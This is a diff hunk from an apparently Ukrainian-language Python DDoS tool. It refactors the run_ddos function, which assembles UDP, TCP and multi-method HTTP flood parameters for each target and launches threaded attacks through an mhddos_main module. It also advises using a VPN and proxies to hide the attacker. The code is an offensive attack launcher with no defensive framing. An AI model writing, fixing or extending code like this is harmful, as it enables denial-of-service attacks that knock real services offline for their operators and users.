@@ -121,29 +121,21 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, debug)
         # UDP
         if target.lower().startswith('udp://'):
             logger.warning(f'Make sure VPN is enabled - proxies are not supported for UDP targets: {target}')
-            params_list.append([
-                'UDP', target[6:], str(UDP_THREADS), str(period)
-            ])
+            params_list.append(['UDP', target[6:], UDP_THREADS, period])
 
         # TCP
         elif target.lower().startswith('tcp://'):
-            params_list.append([
-                'TCP', target[6:], str(threads_per_target), str(period), '0', proxy_file
-            ])
+            params_list.append(['TCP', target[6:], threads_per_target, period, proxy_file])
 
         # HTTP(S)
         else:
             threads = threads_per_target // len(http_methods)
             for method in http_methods:
-                params_list.append([
-                    method, target, '0', str(threads), proxy_file, str(rpc), str(period)
-                ])
+                params_list.append([method, target, threads, period, proxy_file, rpc])
 
     logger.info(f'{bcolors.OKGREEN}Запускаємо атаку...{bcolors.RESET}')
     for params in params_list:
-        if debug:
-            params.append('true')
-        Thread(target=mhddos_main, args=(['', *params],), daemon=True).start()
+        Thread(target=mhddos_main, args=params, kwargs={'debug': debug}, daemon=True).start()
     time.sleep(period + 3)
 
 
